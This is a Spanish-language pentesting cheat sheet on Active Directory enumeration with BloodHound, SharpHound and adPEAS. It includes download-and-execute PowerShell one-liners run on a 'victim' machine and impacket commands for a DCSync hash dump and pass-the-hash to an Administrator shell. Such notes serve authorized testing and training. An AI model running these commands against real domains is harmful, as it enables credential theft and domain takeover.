# BloodHound 

Tags: #AD #Powershell #Windows #Enumeracion #BloodHound 

Bloodhound es una app en JavaScript la cual puede identificar fácilmente ataques altamente complejo que de otro modo seria imposible identificar ademas puede identificar grupos con permisos excesivos. Los defensores pueden usar Bloohound para identificar y eliminar esas mismas rutas de ataque. 

## SharpHound 

* [SharpHound](https://github.com/SpecterOps/BloodHound-Legacy/blob/master/Collectors/SharpHound.ps1)
* [SharpHound](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1)

```powershell
❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1'); 
❯ Invoke-BloodHound -CollectionMethod All     

Nota: Estos comandos los ejecutamos en la maquina victima Windows para recolectar la información y obtener un archivo '.zip' el cual pasaremos a la herramienta de 'BloodHound' para el analisis 
```

## ADPeas

* [ADPeas](https://github.com/61106960/adPEAS)

```powershell 
❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1')

❯ Invoke-adPEAS    # Módulo para hacer la enumeración automatizada

Nota: Podemos usar ADPeas para hacer la recolección ya que automaticamente ejecuta 'SharpHound'
```

## Subir Data por Python a BloodHound

```bash
❯ bloodhound-python -d Domain.local -u User -p Password -ns IP_DC -c all   # Ejecutamos para recopilar la data y asi poder subir el archivo a la plataforma de Bloodhound

Nota: Importamos todos los archivos que fueron generados en formato 'Json'
```

## SharpHound con credenciales Validas desde un CMD en Windows 

```bash 
# Autenticarse en un 'CMD' en Windows con credenciales validas
❯ runas /netonly /user:domain1.com\username cmd    # Autenticarse con credenciales validas a nivel de red en una CMD en Windows> Este comando abrirá una nueva CMD con las credenciales 

❯ dir \\IP\DIR           # Enumerar el directorio con el usuario autenticado desde una CMD en Windows 

❯ .\SharpHound.exe -c all -d domain1.com --domaincontroller IP   # Enumeración con SharpHound a un dominio con credenciales validas desde una CMD en Windows.
Nota: La herramienta regresará un archivo '.zip' que se debe cargar en 'BloodHound' para analizar

❯ python3 -m http.server 80     # Crear un recurso compartido a nivel de red para pasar archivos 
```

## BloodHound 

* [BloodHound](https://github.com/SpecterOps/BloodHound-Legacy/releases)
* [CustomQueries.json - BloodHound](https://github.com/CompassSecurity/BloodHoundQueries)
* [Neo4j-installation](https://neo4j.com/docs/operations-manual/current/installation/linux/debian/)

```bash 
❯ sudo neo4j console &> /dev/null & disown      # Iniciamos el servicio en el puerto local '7474' y lo independizamos

❯ ./BloodHound --no-sandbox & disown            # Ejecutar como usuario 'root' 
❯ bloodhound &> /dev/null & disown              # Ejecutar 'Bloodhound' e independizarlo

Notas: 
	1. Si es la primera vez que se usa, abrir la web 'localhost:7474', agregar las credenciales 'neo4j:neo4j', despues, colocar una nueva passwd y conectarse al 'Bloodhound'
	2. El 'CustomQueries.json' se descarga y se copia en la carpeta donde esta instalado 'BloodHound'
```

```bash 
Identificar lo siguiente en BloodHound:
	1. Identificación de 'Doman Admins'
	2. Identificación de 'usuarios Kerberoasteables'
	3. Identificación de 'usuarios AS-REP Roastable'
	4. Identificación de vectores de ataque 'Find Shortest Paths to Domain Admins'
	5. Identificación de 'Unsconstrained Delegation'
	6. Identificación de usuarios con permisos sobre GPO 'Find if any domain user has interesting against aGPO'
	7. 
```

## Ataques 'DCSync'

```bash 
# Si encontramos en 'Bloodhound' un usuario que tiene un 'GetChangesAll' sobre el dominio podremos hacer un 'DCSync attack' para obtener el hash del usuario 'Administrador' y por lo tanto efectuar un 'Pass-The-Hash'

❯ impacket-secretsdump <Domain/User@IP>    # Hacemos un ataque 'DCSync', debemos de colocar la passwd del usuario 
❯ impacket-psexec <Domain/Administrator@IP> cmd.exe -hashes <:hash>   # Utilizamos 'psexec' para obtener una consola interactiva autenticandonos como el usuario 'Administrator' y colocando su hash para hacer 'Pass-The-Hash'    
```